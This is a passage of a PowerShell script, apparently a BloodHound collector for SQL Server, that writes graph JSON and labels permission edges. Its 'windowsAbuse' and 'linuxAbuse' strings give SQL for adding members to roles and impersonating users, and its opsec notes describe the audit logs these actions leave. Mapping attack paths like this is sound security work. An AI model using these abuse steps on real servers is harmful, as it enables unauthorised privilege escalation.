    $writerObj | Add-Member -MemberType NoteProperty -Name "EdgeCount" -Value 0
    
    # Start JSON structure
    $writerObj.Writer.WriteLine('{')
    $writerObj.Writer.WriteLine('  "graph": {')
    $writerObj.Writer.WriteLine('    "nodes": [')
    $writerObj.Writer.Flush()
    
    return $writerObj
}

function Write-BloodHoundNode {
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]$WriterObj,
        
        [Parameter(Mandatory=$true)]
        [PSObject]$Node
    )
    
    # Skip if we're already stopping
    if ($script:stopProcessing) { return }
    
    try {
        # Check file size limit
        if (Test-FileSizeLimit -WriterObj $WriterObj -SizeLimitString $script:FileSizeLimit) {
            $script:stopProcessing = $true
            return
        }
        
        # Show file size on first node write for this file
        if ($WriterObj.NodeCount -eq 0) {
            Show-CurrentFileSize -WriterObj $WriterObj
        }
        
        # Show periodic file size update
        if (Test-ShouldShowPeriodicUpdate) {
            Show-CurrentFileSize -WriterObj $WriterObj -Context "periodic update"
        }
        
        if (-not $WriterObj.FirstNode) {
            $WriterObj.Writer.WriteLine(',')
        }
        $WriterObj.FirstNode = $false
        $WriterObj.NodeCount++
        $WriterObj.ItemCount++
        
        $json = $Node | ConvertTo-Json -Depth 10 -Compress
        $WriterObj.Writer.Write('      ' + $json)
        $WriterObj.Writer.Flush()
    }
    catch {
        Write-Error "Error writing node: $_"
    }
}

function Write-BloodHoundEdge {
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]$WriterObj,
        
        [Parameter(Mandatory=$true)]
        [PSObject]$Edge
    )
    
    # Skip if we're already stopping
    if ($script:stopProcessing) { return }
    
    try {
        # Check file size limit
        if (Test-FileSizeLimit -WriterObj $WriterObj -SizeLimitString $script:FileSizeLimit) {
            $script:stopProcessing = $true
            return
        }
        
        # Show periodic file size update
        if (Test-ShouldShowPeriodicUpdate) {
            Show-CurrentFileSize -WriterObj $WriterObj -Context "periodic update"
        }
        
        # If this is the first edge ever, close nodes array and start edges array
        if ($WriterObj.EdgeCount -eq 0 -and $WriterObj.NodeCount -gt 0) {
            $WriterObj.Writer.WriteLine('')  # Close last node line
            $WriterObj.Writer.WriteLine('    ],')
            $WriterObj.Writer.WriteLine('    "edges": [')
            $WriterObj.Writer.Flush()
        }
        
        # Write comma if not first edge
        if (-not $WriterObj.FirstEdge) {
            $WriterObj.Writer.WriteLine(',')
        }
        $WriterObj.FirstEdge = $false
        $WriterObj.EdgeCount++
        $WriterObj.ItemCount++
        
        $json = $Edge | ConvertTo-Json -Depth 10 -Compress
        $WriterObj.Writer.Write('      ' + $json)
        $WriterObj.Writer.Flush()
    }
    catch {
        Write-Error "Error writing edge: $_"
    }
}

function Close-BloodHoundWriter {
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]$WriterObj
    )
    
    try {
        # If we wrote nodes but no edges, close nodes array and add empty edges array
        if ($WriterObj.NodeCount -gt 0 -and $WriterObj.EdgeCount -eq 0) {
            $WriterObj.Writer.WriteLine('')
            $WriterObj.Writer.WriteLine('    ],')
            $WriterObj.Writer.WriteLine('    "edges": [')
        }
        
        # Close the JSON structure
        if ($WriterObj.EdgeCount -gt 0 -or $WriterObj.NodeCount -gt 0) {
            $WriterObj.Writer.WriteLine('')
        }
        $WriterObj.Writer.WriteLine('    ]')
        $WriterObj.Writer.WriteLine('  }')
        $WriterObj.Writer.WriteLine('}')
        
        # Ensure everything is written
        $WriterObj.Writer.Flush()
                
        Close-StreamingWriter -WriterObj $WriterObj
    }
    catch {
        Write-Error "Error closing BloodHound file: $_"
        Write-Error $_.Exception.StackTrace
    }
}

# BHGeneric Writer Functions
function New-StreamingBHGenericWriter {
    param(
        [string]$FilePath
    )
    
    $writerObj = New-BaseStreamingWriter -FilePath $FilePath -WriterType "BHGeneric"
    
    # Add BHGeneric-specific properties
    $writerObj | Add-Member -MemberType NoteProperty -Name "FirstNode" -Value $true
    $writerObj | Add-Member -MemberType NoteProperty -Name "FirstEdge" -Value $true
    $writerObj | Add-Member -MemberType NoteProperty -Name "PendingEdges" -Value (New-Object System.Collections.ArrayList)
    $writerObj | Add-Member -MemberType NoteProperty -Name "NodeCount" -Value 0
    $writerObj | Add-Member -MemberType NoteProperty -Name "EdgeCount" -Value 0
    
    # Start JSON structure
    $writerObj.Writer.WriteLine('{')
    $writerObj.Writer.WriteLine('  "nodes": [')
    $writerObj.Writer.Flush()
    
    return $writerObj
}

function Write-BHGenericNode {
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]$WriterObj,
        
        [Parameter(Mandatory=$true)]
        [PSObject]$Node
    )

    # Skip if we're already stopping
    if ($script:stopProcessing) { return }
    
    try {
        # Check file size limit
        if (Test-FileSizeLimit -WriterObj $WriterObj -SizeLimitString $script:FileSizeLimit) {
            $script:stopProcessing = $true
            return
        }

        # Show file size on first node write for this file
        if ($WriterObj.NodeCount -eq 0) {
            Show-CurrentFileSize -WriterObj $WriterObj -Context "starting $($WriterObj.FilePath)"
        }

        # Show periodic file size update
        if (Test-ShouldShowPeriodicUpdate) {
            Show-CurrentFileSize -WriterObj $WriterObj -Context "periodic update"
        }        
        
        if (-not $WriterObj.FirstNode) {
            $WriterObj.Writer.WriteLine(',')
        }
        $WriterObj.FirstNode = $false
        $WriterObj.NodeCount++
        $WriterObj.ItemCount++
        
        $json = $Node | ConvertTo-Json -Depth 10 -Compress
        $WriterObj.Writer.Write('    ' + $json)
        $WriterObj.Writer.Flush()
    }
    catch {
        Write-Error "Error writing node: $_"
    }
}

function Write-BHGenericEdge {
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]$WriterObj,
        
        [Parameter(Mandatory=$true)]
        [PSObject]$Edge
    )

    # Skip if we're already stopping
    if ($script:stopProcessing) { return }
    
    # Check file size limit
    if (Test-FileSizeLimit -WriterObj $WriterObj -SizeLimitString $script:FileSizeLimit) {
        $script:stopProcessing = $true
        return
    }
    
    # If this is the first edge and we haven't transitioned yet
    if ($WriterObj.NodeCount -gt 0 -and $WriterObj.EdgeCount -eq 0) {
        if ($WriterObj.NodeCount -gt 0) {
            $WriterObj.Writer.WriteLine('')
        }
        $WriterObj.Writer.WriteLine('  ],')
        $WriterObj.Writer.WriteLine('  "edges": [')
    }
    
    if ($WriterObj.EdgeCount -gt 0) {
        $WriterObj.Writer.WriteLine(',')
    }
    
    $json = $Edge | ConvertTo-Json -Depth 10 -Compress
    $WriterObj.Writer.Write('    ' + $json)
    $WriterObj.Writer.Flush()
    
    $WriterObj.EdgeCount++
    $WriterObj.ItemCount++
}

function Close-BHGenericWriter {
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]$WriterObj
    )
    
    try {
        # Only add newline if we wrote nodes
        if ($WriterObj.NodeCount -gt 0) {
            $WriterObj.Writer.WriteLine('')
        }
        
        # Close nodes array and start edges array
        $WriterObj.Writer.WriteLine('  ],')
        $WriterObj.Writer.WriteLine('  "edges": [')
        
        # Write all collected edges
        $edgeIndex = 0
        foreach ($edge in $WriterObj.PendingEdges) {
            if ($edgeIndex -gt 0) {
                $WriterObj.Writer.WriteLine(',')
            }
            
            $json = $edge | ConvertTo-Json -Depth 10 -Compress
            $WriterObj.Writer.Write('    ' + $json)
            $edgeIndex++
        }
        
        # Only add newline if we wrote edges
        if ($edgeIndex -gt 0) {
            $WriterObj.Writer.WriteLine('')
        }
        
        # Close the JSON structure
        $WriterObj.Writer.WriteLine('  ]')
        $WriterObj.Writer.WriteLine('}')
        
        # Ensure everything is written
        $WriterObj.Writer.Flush()
        
        Write-Host "Wrote $($WriterObj.NodeCount) nodes and $($WriterObj.EdgeCount) edges to single BHGeneric file" -ForegroundColor Cyan
        
        Close-StreamingWriter -WriterObj $WriterObj
    }
    catch {
        Write-Error "Error closing BHGeneric file: $_"
    }
}

# Function to determine node type from server or database principal
function Get-NodeType {
    param($Object, $ExplicitType = $null, $Context = "", $IsServerLevel = $null)
    
    if ($ExplicitType) { return $ExplicitType }
    
    # serverInfo objects
    elseif ($Object.PSObject.Properties.Name -contains "ServerPrincipals") {
        return "MSSQL_Server"
    }
    
    # database objects
    elseif ($Object.PSObject.Properties.Name -contains "DatabasePrincipals") {
        return "MSSQL_Database"
    }
    
    # Server and database principal objects
    elseif ($Object.PSObject.Properties.Name -contains "TypeDescription" -and $Object.TypeDescription) {
        switch ($Object.TypeDescription) {
            "SERVER_ROLE" { return "MSSQL_ServerRole" }
            "DATABASE_ROLE" { return "MSSQL_DatabaseRole" }
            "APPLICATION_ROLE" { return "MSSQL_ApplicationRole" }
            { $_ -in @("WINDOWS_LOGIN", "SQL_LOGIN", "ASYMMETRIC_KEY_MAPPED_LOGIN", "CERTIFICATE_MAPPED_LOGIN") } { 
                return "MSSQL_Login" 
            }
            { $_ -in @("WINDOWS_USER", "SQL_USER", "ASYMMETRIC_KEY_MAPPED_USER", "CERTIFICATE_MAPPED_USER") } { 
                return "MSSQL_DatabaseUser" 
            }    
            "WINDOWS_GROUP" {
                # Check ObjectIdentifier pattern first
                if ($Object.PSObject.Properties.Name -contains "ObjectIdentifier" -and $Object.ObjectIdentifier) {
                    if ($Object.ObjectIdentifier -like "*@*\*") {
                        return "MSSQL_DatabaseUser"  # Database-level Windows group
                    } elseif ($Object.ObjectIdentifier -like "*@*") {
                        return "MSSQL_Login"  # Server-level Windows group
                    }
                }
                
                # Fall back to context hints
                if ($IsServerLevel -eq $true) {
                    return "MSSQL_Login"
                } elseif ($IsServerLevel -eq $false) {
                    return "MSSQL_DatabaseUser"
                }
            }
        }
    }
       
    Write-Warning "Unable to determine node type for $Context object"
    return "Unknown"
}

function Set-EdgeContext {
    param(
        [Parameter(Mandatory=$true)]
        $SourcePrincipal,
        
        [Parameter(Mandatory=$false)]
        $TargetPrincipal = $null, # Use explicit target
        
        [Parameter(Mandatory=$false)]
        $Permission = $null,
        
        [Parameter(Mandatory=$false)]
        [string]$DatabaseName = $null,
        
        [Parameter(Mandatory=$false)]
        $ServerInfo = $null,  # Use permission-based target resolution
        
        [Parameter(Mandatory=$false)]
        $DatabaseInfo = $null,  # Use permission-based target resolution
        
        # Explicit type overrides for special cases
        [Parameter(Mandatory=$false)]
        [string]$SourceType = $null,
        
        [Parameter(Mandatory=$false)]
        [string]$TargetType = $null
    )
        
    # Determine if we're in server or database context
    $isSourceServerLevel = $null
    $isTargetServerLevel = $null
    
    # Determine context from DatabaseName parameter
    if ($DatabaseName) {
        $isSourceServerLevel = $false  # If DatabaseName is specified, source is database-level
        $isTargetServerLevel = $false
    }
    
    # Determine context from ObjectIdentifier patterns
    if ($SourcePrincipal.PSObject.Properties.Name -contains "ObjectIdentifier" -and $SourcePrincipal.ObjectIdentifier) {
        if ($SourcePrincipal.ObjectIdentifier -like "*@*\*") {
            $isSourceServerLevel = $false  # Database-scoped
        } elseif ($SourcePrincipal.ObjectIdentifier -like "*@*" -and $SourcePrincipal.ObjectIdentifier -notlike "*\*") {
            $isSourceServerLevel = $true   # Server-scoped
        }
    }
    
    # Resolve target from permission if needed
    $resolvedTarget = $TargetPrincipal
    if (-not $resolvedTarget -and $Permission -and $Permission.PSObject.Properties.Name -contains "TargetObjectIdentifier") {
        if ($Permission.TargetObjectIdentifier) {
            # Look for target in server principals
            if ($ServerInfo) {
                $resolvedTarget = $ServerInfo.ServerPrincipals | Where-Object { 
                    $_.ObjectIdentifier -eq $Permission.TargetObjectIdentifier 
                } | Select-Object -First 1
                
                if ($resolvedTarget) {
                    $isTargetServerLevel = $true
                }
                
                # Look for target in databases
                if (-not $resolvedTarget) {
                    $resolvedTarget = $ServerInfo.Databases | Where-Object { 
                        $_.ObjectIdentifier -eq $Permission.TargetObjectIdentifier 
                    } | Select-Object -First 1
                    
                    if ($resolvedTarget) {
                        $isTargetServerLevel = $null  # Database object itself
                    }
                }
                
                # Look for target in database principals
                if (-not $resolvedTarget -and $DatabaseInfo) {
                    $resolvedTarget = $DatabaseInfo.DatabasePrincipals | Where-Object { 
                        $_.ObjectIdentifier -eq $Permission.TargetObjectIdentifier 
                    } | Select-Object -First 1
                    
                    if ($resolvedTarget) {
                        $isTargetServerLevel = $false
                    }
                }
                
                # Check if target is the server itself
                if (-not $resolvedTarget -and $ServerInfo.ObjectIdentifier -eq $Permission.TargetObjectIdentifier) {
                    $resolvedTarget = $ServerInfo
                    $isTargetServerLevel = $null  # Server object itself
                }
            }
        }
    }
    
    # Determine target context from ObjectIdentifier if we have a target
    if ($resolvedTarget -and $resolvedTarget.PSObject.Properties.Name -contains "ObjectIdentifier" -and $resolvedTarget.ObjectIdentifier) {
        if ($resolvedTarget.ObjectIdentifier -like "*@*\*") {
            $isTargetServerLevel = $false  # Database-scoped
        } elseif ($resolvedTarget.ObjectIdentifier -like "*@*" -and $resolvedTarget.ObjectIdentifier -notlike "*\*") {
            $isTargetServerLevel = $true   # Server-scoped
        }
    }
    
    # If still no target, use ServerInfo as fallback for server-level permissions
    if (-not $resolvedTarget -and $ServerInfo) {
        $resolvedTarget = $ServerInfo
        $isTargetServerLevel = $null  # Server object itself
    }
    
    # Validate that we have a target
    if (-not $resolvedTarget) {
        Write-Error "Set-EdgeContext: Could not determine target principal. Permission: $($Permission | ConvertTo-Json -Depth 1 -Compress)"
        return $false
    }
    
    # Determine source and target node types with context
    $sourceNodeType = Get-NodeType -Object $SourcePrincipal -ExplicitType $SourceType -Context "source" -IsServerLevel $isSourceServerLevel
    $targetNodeType = Get-NodeType -Object $resolvedTarget -ExplicitType $TargetType -Context "target" -IsServerLevel $isTargetServerLevel
    
    # Set the context
    $script:CurrentEdgeContext = @{
        principal = $SourcePrincipal
        principalNodeType = $sourceNodeType
        targetPrincipal = $resolvedTarget
        targetPrincipalNodeType = $targetNodeType
        perm = $Permission
        databaseName = $DatabaseName
    }
    
    # Validate that we got valid types
    if ($sourceNodeType -eq "Unknown" -or $targetNodeType -eq "Unknown") {
        Write-Warning "Set-EdgeContext: Could not determine all node types. Source: $sourceNodeType, Target: $targetNodeType"
        Write-Debug "Current Context: $($script:CurrentEdgeContext | ConvertTo-Json -Depth 2)"
        return $false
    }
    
    return $true
}

$script:EdgePropertyGenerators = @{

    ############################
    ##  offensive edge kinds  ##
    #############################

    "MSSQL_AddMember" = {
    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_ServerRole
    #       MSSQL_ServerRole        -> MSSQL_ServerRole
    #   Requirements
    #       SQL Server 2012 or higher (beginning of support for user-defined server roles)
    #       ALTER ANY SERVER ROLE or ALTER/CONTROL on a specific user-defined server role (can't assign ALTER/CONTROL on fixed roles)
    #       Can only add members to fixed roles user is a member of (except sysadmin) and to user-defined roles (doesn't require membership)
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[ServerRole])

    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseRole
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseRole
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseRole
    #   Requirements
    #       ALTER ANY ROLE or ALTER/CONTROL on a specific user-defined database role (can't assign ALTER/CONTROL on fixed roles)
    #       User-defined roles only, fixed roles are not affected unless you’re db_owner
    #   Default fixed roles with permission
    #       db_owner (not drawing edge, included under ControlDB -> Contains[DBRole])
    #       db_securityadmin
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[DB] -> Contains[DBRole])

        param($context)
        return @{
            traversable = $true                     
            general = "The source $($context.principalNodeType) can add members to this $($context.targetPrincipalNodeType), granting the new member the permissions assigned to the role."
            windowsAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                            $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER_ROLE') {
                                "EXEC sp_addsrvrolemember 'login_name', '$($context.targetPrincipal.Name)';"
                            } else {
                                "EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'user_name';"
                            })"
            linuxAbuse = "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                            $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER_ROLE') {
                                "EXEC sp_addsrvrolemember 'login_name', '$($context.targetPrincipal.Name)';"
                            } else {
                                "EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'user_name';"
                            })"
            opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                    Log events are generated by default for additions to role membership. `n
                    To view role membership change logs, execute: `n
                        $(if ($context.targetPrincipal.TypeDescription -eq 'SERVER_ROLE') {
                            "SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC;"
                        } else {
                            "SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;"
                        })"
            references = "$(if ($context.targetPrincipal.TypeDescription -eq 'SERVER_ROLE') {
                        "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addsrvrolemember-transact-sql?view=sql-server-ver17"
                        } else {
                            "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17"
                        }) `n
                        - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
            composition = 
                if ($context.targetPrincipal.TypeDescription -eq 'SERVER_ROLE') {
                    "MATCH (source {objectid: '$($context.principal.ObjectIdentifier.Replace('\','\\').ToUpper())'}), (server:MSSQL_Server {objectid: '$($context.principal.SQLServerID.Replace('\','\\').ToUpper())'}), (role:MSSQL_ServerRole {objectid: '$($context.targetPrincipal.ObjectIdentifier.Replace('\','\\').ToUpper())'})
                    OPTIONAL MATCH p1 = (source)-[:MSSQL_AlterAnyServerRole]->(server)
                    OPTIONAL MATCH p2 = (server)-[:MSSQL_Contains]->(role)
                    OPTIONAL MATCH p3 = (source)-[:MSSQL_Alter|MSSQL_Control]->(role)
                    MATCH p4 = (source)-[:MSSQL_AddMember]->(role)
                    WHERE (p1 IS NOT NULL AND p2 IS NOT NULL) OR p3 IS NOT NULL
                    RETURN p1, p2, p3, p4"
                } else {
                    "MATCH (source {objectid: '$($context.principal.ObjectIdentifier.Replace('\','\\').ToUpper())'}), 
                    (server:MSSQL_Server {objectid: '$($context.principal.SQLServerID.Replace('\','\\').ToUpper())'}), 
                    (database:MSSQL_Database {objectid: '$($context.targetPrincipal.ObjectIdentifier.Split('@')[1].Replace('\','\\').ToUpper())'}),
                    (role:MSSQL_DatabaseRole {objectid: '$($context.targetPrincipal.ObjectIdentifier.Replace('\','\\').ToUpper())'})
                    MATCH p0 = (source)-[:MSSQL_AddMember]->(role)
                    MATCH p1 = (server)-[:MSSQL_Contains]->(database)
                    MATCH p2 = (database)-[:MSSQL_Contains]->(source)
                    MATCH p3 = (database)-[:MSSQL_Contains]->(role)
                    OPTIONAL MATCH p4 = (source)-[:MSSQL_AlterAnyDBRole]->(database)
                    OPTIONAL MATCH p5 = (source)-[:MSSQL_Alter|MSSQL_Control]->(role)
                    RETURN p0, p1, p2, p3, p4, p5"
                }
        }
    }

    "MSSQL_Alter" = {
    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_ServerRole
    #       MSSQL_ServerRole        -> MSSQL_ServerRole
    #   Requirements
    #       ALTER on a securable server object

    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_Database
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseUser
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseRole
    #       MSSQL_DatabaseUser      -> MSSQL_ApplicationRole
    #       MSSQL_DatabaseRole      -> MSSQL_Database
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseUser
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseRole
    #       MSSQL_DatabaseRole      -> MSSQL_ApplicationRole
    #       MSSQL_ApplicationRole   -> MSSQL_Database
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseUser    
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseRole
    #       MSSQL_ApplicationRole   -> MSSQL_ApplicationRole
    #   Requirements
    #       ALTER on a securable database object

        param($context)
        return @{
            traversable = $false
            general = "The `ALTER` permission on a securable object allows the source $($context.principalNodeType) to change properties, except ownership, of a particular securable object."
            windowsAbuse = $(
                if ($context.databaseName) {
                    # Database-level targets
                    if ($context.targetPrincipal.TypeDescription -eq "DATABASE_ROLE") {
                        # Database role - add members
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                            `USE $($context.databaseName);` `n
                            Add member: `EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'user_name';` "
                    } elseif ($context.targetPrincipal.TypeDescription -eq "DATABASE") {
                        # Database itself - grants ALTER ANY ROLE and ALTER ANY APPLICATION ROLE
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                            `USE $($context.targetPrincipal.Name);` `n
                            Add member to any user-defined role: `EXEC sp_addrolemember 'role_name', 'user_name';` `n
                            Note: ALTER on database grants effective permissions ALTER ANY ROLE and ALTER ANY APPLICATION ROLE."
                    }
                } else {
                    # Server-level targets
                    if ($context.targetPrincipal.TypeDescription -eq "SERVER_ROLE") {
                        # Server role - add members
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                            Add member: `EXEC sp_addsrvrolemember 'login_name', '$($context.targetPrincipal.Name)';` "
                    }
                }
            )
            linuxAbuse = $(
                if ($context.databaseName) {
                    # Database-level targets
                    if ($context.targetPrincipal.TypeDescription -eq "DATABASE_ROLE") {
                        # Database role - add members
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                            `USE $($context.databaseName);` `n
                            Add member: `EXEC sp_addrolemember '$($context.targetPrincipal.Name)', 'user_name';` "
                    } elseif ($context.targetPrincipal.TypeDescription -eq "DATABASE") {
                        # Database itself - grants ALTER ANY ROLE and ALTER ANY APPLICATION ROLE
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                            `USE $($context.targetPrincipal.Name);` `n
                            Add member to any user-defined role: `EXEC sp_addrolemember 'role_name', 'user_name';` `n
                            Note: ALTER on database grants effective permissions ALTER ANY ROLE and ALTER ANY APPLICATION ROLE."
                    }
                } else {
                    # Server-level targets
                    if ($context.targetPrincipal.TypeDescription -eq "SERVER_ROLE") {
                        # Server role - add members
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:`n
                            Add member: `EXEC sp_addsrvrolemember 'login_name', '$($context.targetPrincipal.Name)';` "
                    }
                }
            )
            opsec = $(
                if ($context.databaseName) {
                    # Database-level
                    if ($context.targetPrincipal.TypeDescription -eq "DATABASE_ROLE") {
                        "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                        Log events are generated by default for additions to database role membership. `n
                        To view database role membership change logs, execute: `n
                            `SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;` "
                    } elseif ($context.targetPrincipal.TypeDescription -eq "DATABASE") {
                        "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                        Log events are generated by default for additions to database role membership when ALTER DATABASE permission is used to add members to roles."
                    }
                } else {
                    # Server-level
                    if ($context.targetPrincipal.TypeDescription -eq "SERVER_ROLE") {
                        "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. `n
                        Log events are generated by default for additions to server role membership. `n
                        To view server role membership change logs, execute: `n
                            `SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC;` "
                    }
                }
            )
            references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions `n
                        - https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17 `n
                        - https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17"
        }
    }

    "MSSQL_Control" = {
    # Weird one - CONTROL doesn't always mean full control of the target node and ability to traverse all its outbound edges.
    # For example, CONTROL on an application role does not allow you to change its password (requires ALTER ANY APPLICATION ROLE as well)
    # Making this non-traversable to avoid other cases like this

    # Server level
    #   Source and target node types
    #       MSSQL_Login             -> MSSQL_Login
    #       MSSQL_Login             -> MSSQL_ServerRole
    #       MSSQL_ServerRole        -> MSSQL_Login
    #       MSSQL_ServerRole        -> MSSQL_ServerRole
    #   Requirements
    #       CONTROL on a securable server object
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[object])

    # Database level
    #   Source and target node types
    #       MSSQL_DatabaseUser      -> MSSQL_Database
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseUser
    #       MSSQL_DatabaseUser      -> MSSQL_DatabaseRole
    #       MSSQL_DatabaseUser      -> MSSQL_ApplicationRole
    #       MSSQL_DatabaseRole      -> MSSQL_Database
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseUser
    #       MSSQL_DatabaseRole      -> MSSQL_DatabaseRole
    #       MSSQL_DatabaseRole      -> MSSQL_ApplicationRole
    #       MSSQL_ApplicationRole   -> MSSQL_Database
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseUser    
    #       MSSQL_ApplicationRole   -> MSSQL_DatabaseRole
    #       MSSQL_ApplicationRole   -> MSSQL_ApplicationRole
    #   Requirements
    #       CONTROL on a securable database object
    #   Default fixed roles with permission
    #       sysadmin (not drawing edge, included under ControlServer -> Contains[object])
    #       dbo/db_owner (not drawing edge, included under ControlDB -> Contains[object])

        param($context)
        return @{
            traversable = $false
            general = "The `CONTROL` permission on a securable object effectively grants the source $($context.principalNodeType) all defined permissions on the securable object and its descendent objects. CONTROL at a particular scope includes CONTROL on all securable objects under that scope (e.g., CONTROL on a database includes control of all permissions on the database as well as all permissions on all assemblies, schemas, and other objects within all schemas in the database)."
            windowsAbuse = $(
                if ($context.databaseName) {
                    # Database-level targets
                    if ($context.targetPrincipal.TypeDescription -in @("WINDOWS_USER", "WINDOWS_GROUP", "SQL_USER", "ASYMMETRIC_KEY_MAPPED_USER", "CERTIFICATE_MAPPED_USER")) {
                        # Database user - impersonation
                        "Connect to the $($context.principal.SQLServerName) SQL server as $($context.principal.Name) (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:`n
                            `USE $($context.databaseName);` `n
                            `EXECUTE AS USER = '$($context.targetPrincipal.Name)'` `n
                            `   SELECT USER_NAME()` `n
                            `REVERT ` "
                    } elseif ($context.targetPrincipal.TypeDescription -eq "DATABASE_ROLE") {
                        # Database role - add member and change owner
